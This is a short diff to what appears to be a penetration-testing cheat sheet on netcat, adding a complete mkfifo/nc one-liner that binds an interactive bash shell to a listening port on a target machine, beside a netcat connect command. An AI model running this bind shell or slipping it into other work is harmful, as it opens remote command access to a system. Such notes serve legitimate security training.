@@ -20,6 +20,7 @@ nc -nv <TARGET IP> <PORT>
 
 ## Establishing Basic Bind Shell to Interact with Basg
 
-#### 1) Put a bash shell on the TCP session
-```rm -f /tmp/f; mkfifo /tmp/f; cat 
+#### 1) Put a bash shell on the TCP session on Target Machine
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <PORT> > /tmp/f
 ```
